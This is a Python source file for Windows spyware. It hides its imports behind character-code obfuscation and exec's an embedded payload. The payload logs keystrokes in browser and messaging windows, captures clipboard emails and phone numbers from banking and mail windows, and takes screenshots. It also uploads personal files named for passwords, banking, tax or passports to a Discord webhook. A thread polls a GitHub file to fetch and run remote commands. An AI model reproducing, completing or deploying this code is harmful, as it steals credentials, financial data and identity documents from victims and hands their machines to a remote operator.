
import builtins
from time import sleep
from random import randint
from queue import Queue
from json import load as lod
from win32event import CreateMutex
from win32api import GetLastError
from marshal import load
from io import BytesIO
os = __import__(f'{chr(110+1)}{chr(110+5)}')
subp_ = __import__(f'{chr(115)}{chr(117)}{chr(98)}{chr(112)}{chr(114)}{chr(111)}{chr(99)}{chr(100 + 1)}{chr(115)}{chr(110+5)}')
bdecode = getattr(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}'), f'{chr(98)}{chr(54)}{chr(52)}{chr(100)}{chr(101)}{chr(99)}{chr(111)}{chr(100)}{chr(101)}')

datetime = __import__(f'{chr(100)}{chr(97)}{chr(116)}{chr(101)}{chr(116)}{chr(105)}{chr(109)}{chr(101)}')
get = getattr(__import__(f'{chr(114)}{chr(101)}{chr(113)}{chr(117)}{chr(101)}{chr(115)}{chr(116)}{chr(115)}'), f'{chr(103)}{chr(101)}{chr(116)}')
exfil_url = "https://discord.com/api/webhooks/1306058752729940029/mFyF11KAQ7b2kR6Q4zTmb9ebEzhXXH8Uxx4nWy6E2GlfaRIZYrzqKg6qxSkQrSDV6FCV"
beacon = "https://raw.githubusercontent.com/Cipher-935/TubeTransfer/main/test.txt"
code = """
try:
    del stager
    del enc_text
    del enc_key
    del b
    del decoded
    del cipher
    del content

    Queue = getattr(__import__('queue'), 'Queue')
    mss = __import__(f'{chr(109)}{chr(115)}{chr(115)}')
    keyboard = getattr(__import__(f'{chr(112)}{chr(121)}{chr(110)}{chr(112)}{chr(117)}{chr(116)}'), f'{chr(107)}{chr(101)}{chr(121)}{chr(98)}{chr(111)}{chr(97)}{chr(114)}{chr(100)}')
    Thread =  getattr(__import__(f'{chr(116)}{chr(104)}{chr(114)}{chr(101)}{chr(97)}{chr(100)}{chr(105)}{chr(110)}{chr(103)}'), f'{chr(84)}{chr(104)}{chr(114)}{chr(101)}{chr(97)}{chr(100)}')
    post = getattr(__import__(f'{chr(114)}{chr(101)}{chr(113)}{chr(117)}{chr(101)}{chr(115)}{chr(116)}{chr(115)}'), f'{chr(112)}{chr(111)}{chr(115)}{chr(116)}')
    bencode = getattr(__import__(f'{chr(98)}{chr(97)}{chr(115)}{chr(101)}{chr(54)}{chr(52)}'), f'{chr(98)}{chr(54)}{chr(52)}{chr(101)}{chr(110)}{chr(99)}{chr(111)}{chr(100)}{chr(101)}')
    getActiveWindowTitle = getattr(__import__(f'{chr(112)}{chr(121)}{chr(103)}{chr(101)}{chr(116)}{chr(119)}{chr(105)}{chr(110)}{chr(100)}{chr(111)}{chr(119)}'), f'{chr(103)}{chr(101)}{chr(116)}{chr(65)}{chr(99)}{chr(116)}{chr(105)}{chr(118)}{chr(101)}{chr(87)}{chr(105)}{chr(110)}{chr(100)}{chr(111)}{chr(119)}{chr(84)}{chr(105)}{chr(116)}{chr(108)}{chr(101)}')
    paste = getattr(__import__(f'{chr(112)}{chr(121)}{chr(112)}{chr(101)}{chr(114)}{chr(99)}{chr(108)}{chr(105)}{chr(112)}'), f'{chr(112)}{chr(97)}{chr(115)}{chr(116)}{chr(101)}')
    search = getattr(__import__(f'{chr(114)}{chr(101)}'), f'{chr(115)}{chr(101)}{chr(97)}{chr(114)}{chr(99)}{chr(104)}')
    
    k_que = Queue(maxsize=65)
    c_que = Queue(maxsize=2)
    
    bot_id = os.getlogin() + f"{randint(2,5)}{randint(5,9)}{randint(1,4)}{randint(3,9)}{randint(10,18)}"

    curr_win = ''

    def clip_board_monitor():
        global bot_id
        global c_que
        last_paste = ''
        check_wins = ['Banking', 'bank', 'Payment', 'Inbox', 'gmail', 'outlook', 'chrome', 'edge', 'whatsapp', 'firefox']
        re_checks = [
        r'[a-zA-Z0-9._%+-]+@(?:gmail\\.com|outlook\\.com|yahoo\\.com)',
        r'(?:\\+1\\s?)?(?:\\(?\\d{3}\)?[\\s.-]?)?\\d{3}[\\s.-]?\\d{4}'
        ]
        while True:
            try:
                n_clip_win = getActiveWindowTitle() or "Unknown"
                if c_que.full():
                    queue_data = ""
                    while not c_que.empty():
                        queue_data += c_que.get()
                    c_data = bencode(queue_data.encode()).decode('utf-8')
                    ff = {"file": (f"{bot_id}_{datetime.datetime.now().strftime("%Y-%m-%d - %I-%M %p")}_paste.txt", c_data)}
                    post(exfil_url, files=ff, headers=head)
                current_clipboard_content = paste().strip()
                if any(word.lower() in (n_clip_win or '').lower() for word in check_wins):
                    if current_clipboard_content != last_paste:
                        for pat in re_checks:
                            if search(pat, current_clipboard_content):
                                last_paste = current_clipboard_content
                                c_que.put(f' {n_clip_win}: [PASTE] -> {current_clipboard_content}\\n')
                                break
            except Exception as e:
                pass
            
    def c2_command_thread():
        global bot_id
        while True:
            sleep(randint(4,10))
            rec_data = get(beacon, headers=head)
            if rec_data.status_code == 200:
                payload = rec_data.text
                if payload.strip() == "":
                        sleep(randint(120, 240))
                else:
                    try:
                        c_list = payload.split("*")
                        del payload
                        del rec_data
                        bot = c_list[0]
                        command = c_list[1]
                        del c_list
                        if bot == bot_id or bot == 'blackphilip':
                            try:
                                OOO__(bdecode(command.strip().replace('#', 'm').replace('?', 'V').replace('!', 'Y').replace('^', 'J')).decode('utf-8'))    
                                sleep(randint(120, 240))
                            except Exception as e:
                                post(exfil_url, json=({"content": f"Error in commnad execution: {e}. BOT: {bot_id}"}), headers=head)
                    except Exception as qq:
                            sleep(randint(120,240))
            else:
                sleep(randint(100, 180))
                
    def file_grabber():
        global bot_id
        directories = [
         os.path.join(os.getenv("USERPROFILE"), 'Documents'),
         os.path.join(os.getenv("USERPROFILE"), 'Downloads'),
         os.path.join(os.getenv("USERPROFILE"), 'Desktop'),
        ]
        keywords = [
        'finals', 'final', 'password', 'passwords' 'bank', 'payroll',
        'resume', 'job', 'offer', 'letter', 'record', 'records', 'cover', 'reference','passport', 'social', 'credit', 'account',
        'invoice', 'tax', 'statement', 'payment', 'transaction', 'cv', 'SIN', 'credentials', 'receipt', 'banking'
        ]
        e_list = ['bin', 'include', 'app', 'src', 'node_modules', 'venv', 'dist', 'site-packages', 'lib']
        pp_ath = os.path.join(os.getenv('LOCALAPPDATA'), 'exfil.txt')
        if not os.path.exists(pp_ath):
            with open(pp_ath, 'w') as o:
                    o.write('')
            os.system(f"attrib +h {pp_ath}")
        with open(pp_ath, 'r') as o:
            path_set = set(o.read().splitlines())
        for directory in directories:
            if os.path.exists(directory):
                    for root, dirs, files in os.walk(directory):
                        dirs[:] = [d for d in dirs if not any(part in e_list for part in os.path.join(root, d).split(os.path.sep))]
                        for filename in files:
                            if not os.path.join(root,filename) in path_set:
                                if any(keyword.lower() in filename.lower() for keyword in keywords):
                                    with open(os.path.join(root,filename), 'rb') as k:
                                        dat = k.read()
                                        ff = {"file": (f"{bot_id}_{os.path.basename(filename)}", dat)}
                                        res = post(exfil_url, files=ff, headers=head)
                                        if res.status_code == 200:
                                            with open(pp_ath, 'a') as d:
                                                d.write(f'{os.path.join(root,filename)}\\n')
                                        sleep(randint(120,240))
        return
    
    def screenshot_loop():
        with mss.mss() as sct:
            while True:
                try:
                    c_win = getActiveWindowTitle() or "Unknown"
                    bb = ['chrome', 'firefox', 'edge', 'brave', 'whatsapp']
                    if any(b in c_win.lower() for b in bb):
                        screenshot = sct.grab(sct.monitors[0])
                        img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
                        buf = BytesIO(img_bytes)
                        fff = {'file': (f'{bot_id}_{datetime.datetime.now().strftime("%Y-%m-%d - %I-%M %p")}_ss.png', buf, 'image/png')}
                        post(exfil_url, files=fff, headers=head)
                except Exception as e:
                    print(e)
                    break
                sleep(randint(80, 130))
        return
            
    def key_log_thread(key):
        global curr_win
        global k_que
        new_win = ''
        if k_que.full():
            p_dat = ''
            while not k_que.empty():
                p_dat += k_que.get()
                ff_dat = bencode(p_dat.encode('utf-8')).decode('utf-8')
                ff = {"file": (f"{bot_id}_{datetime.datetime.now().strftime("%Y-%m-%d - %I-%M %p")}_key.txt", ff_dat)}
            post(exfil_url, files=ff, headers=head)
        try:
            try:
                new_win = getActiveWindowTitle()
            except:
                new_win = ''
            if new_win:
                if curr_win != new_win:
                    curr_win = new_win
                    if any(browser in curr_win.lower() for browser in ['chrome', 'edge', 'firefox', 'incognito', 'browser', 'email', 'whatsapp']):
                        k_que.put(f' [Window]: {curr_win}\\n')
                if any(browser in curr_win.lower() for browser in ['chrome', 'edge', 'firefox', 'incognito', 'browser', 'email', 'whatsapp']):
                    try:
                        k_que.put(f' {key.char}\\n')
                    except AttributeError:
                        k_que.put(f' {key}\\n')
        except Exception as e:
            pass
    listener = keyboard.Listener(on_press=key_log_thread)
    listener.start()
    

    try:
        clipboard_thread = Thread(target= clip_board_monitor)
        clipboard_thread.start()
    except Exception as e:
        pass
    try:
        greabber_thread = Thread(target = file_grabber)
        greabber_thread.start()
    except Exception as l:
        pass
    
    try:
        ss_thread = Thread(target = screenshot_loop)
        ss_thread.start()
    except Exception as l:
        pass
    
    try:
        c_thread = Thread(target = c2_command_thread)
        c_thread.start()
    except Exception as r:
        pass
        
    listener.join()
except Exception as k:
    pass
"""
exec(code)